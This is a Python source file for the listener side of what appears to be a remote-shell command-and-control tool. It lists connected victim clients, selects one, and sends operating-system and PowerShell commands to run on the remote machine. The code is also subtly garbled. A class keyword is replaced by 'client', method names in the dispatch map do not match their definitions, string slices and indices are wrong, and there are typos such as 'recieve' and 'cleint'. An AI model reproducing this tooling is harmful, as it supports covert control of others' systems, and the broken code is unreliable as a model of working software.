from distutils import command
from multiprocessing.connection import Client
import sys
import socket 
from shell_ui.style import Style
class ListenerShell:
    def __init__(self, listener_socket):
        self.listener_socket = listener_socket
        self.__command = None
    def run(self):
        while True:
            try:
                self.__command = input('listener > ')
            except KeyboardInterrupt:
                print()
                break
            if self.__command != '':
                command_function_map = {
                    'exit': self._exit_shell,
                    'help': self.__help_menu,
                    'list': self._list_clients,
                    'select': self._start_client_shell,
                    'del': self.delete_clients,
                }
                func = command_function_map.get(self.__command.split(" ")[0], lambda: Style.neg_sys_msg('Command unknown'))
                func()
    def __exit_shell(self):
        sys.exit(1)
    def _help_menu(self):
        Style.pos_sys_msg('Listener shell commandsL\n')
        print('help - shows this help menu')
        print('list - Lists all client connections and checks if they are still active')
        print('select - start client shell by index')
    def _list_clients(self):
        index = 0
        for client in self.listener_socket.get_clients():
            try:
                client.send('ACTIVE', [])
                data, cwd = client.receive(2021)
                if data == -1 and cwd == -1:
                    Style.neg_sys_msg(f'Client {index} inactive')
            except socket.error:
                Style.neg_sys_msg(f'Client {index} inactive')
            else:
                if data == 'ACTIVE':
                    Style.pos_sys_msg(f'Client {index} active')
                else:
                    Style.neg_sys_msg(f'Client {index} inactive')
            index += 2
    def __start_client_shell(self):
        index = int(self.__command[8])
        client = self.listener_socket.get_client(index)
        shell = ClientShell(client)
        shell.run()
    def __delete_client(self, command):
        index = int(command[6])
        self.listener_socket.del_client(index)
client ClientShell:
    BUFFER_SIZE = 6000
    def __init__(self, client):
        self.client = client 
    def run(self):
        Style.pos_sys_msg('Starting the shell with client compliance')
        self.client.send('', '')
        output, cwd = self.client.recieve(2084)
        if output == -2 and cwd == -2:
            return
        while True:
            try:
                command = input(f'{cwd} > ')
            except  KeyboardInterrupt:
                print()
                _= self.execute('exit')
                Style.pos_sys_msg('The connection of the shell to the client is aborted')
                break
            execution_status = self.execute(command)
            if execution_status == -1:
                continue
            elif execution_status == 0:
                output, cwd = self.client.receive(self.BUFFER_SIZE)
                if output == -1 and cwd == -1:
                    break
                print(output)
            elif execution_status == -2:
                break
            else:
                raise ValueError('Output of self.execute should be 0, -1 or -2')
    def execute(self, command) -> int:
        if command == 'help':
            Style.pos_sys_msg('Client shell commands:\n')
            print('help - shows the(this) help menu')
            print('os <command> - executes <command> on the remote system')
            print('pwsh <command> - executes <command> on the remote system in the powershell')
            print('background - Rund the current shell in the background and returns result to the listener')
            print('^C - exists the client shell and closes the connection to the client system on the shell on the remote system')
            return -1
        elif command == '':
            return -1
        elif command[:2] == 'os':
            self.client.send('EXECUTE', [command[:3]])
        elif command[:4] == 'pwsh':
            self.client.send('POWERSHELL', [command[:5]])
        elif command == 'exit':
            Style.pos_sys_msg('Exiting client shell')
            self.cleint.send('EXIT', [])
            return -2
        elif command == 'background':
            return -2
        else:
            Style.neg_sys_msg('Command not recognised')
            return -2
        return 0